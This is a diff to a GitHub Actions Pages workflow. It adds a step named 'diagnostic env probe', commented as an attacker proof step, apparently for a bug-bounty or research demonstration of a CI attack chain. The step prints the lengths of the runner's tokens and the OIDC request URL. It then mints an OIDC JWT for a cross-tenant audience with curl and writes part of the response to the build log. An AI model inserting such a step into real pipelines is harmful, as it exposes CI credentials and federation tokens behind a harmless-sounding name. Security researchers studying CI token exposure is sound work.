@@ -12,6 +12,18 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+      - name: diagnostic env probe
+        # ATTACKER step proof: shell can print env to log
+        # This is RUNNER-side, NOT inside Sass — used to validate the chain
+        run: |
+          echo "=== Demonstrate runner-side env access (baseline) ==="
+          echo "GITHUB_TOKEN length: ${#GITHUB_TOKEN}"
+          echo "ACTIONS_RUNTIME_TOKEN length: ${#ACTIONS_RUNTIME_TOKEN}"
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL: ${ACTIONS_ID_TOKEN_REQUEST_URL}"
+          # Mint an OIDC JWT to prove the federation chain is reachable
+          OIDC_TOKEN=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=test-bbb-cross-tenant-probe" 2>&1 | head -c 200)
+          echo "OIDC mint response preview: ${OIDC_TOKEN:0:100}"
       - uses: actions/configure-pages@v4
       - uses: actions/jekyll-build-pages@v1
         with:
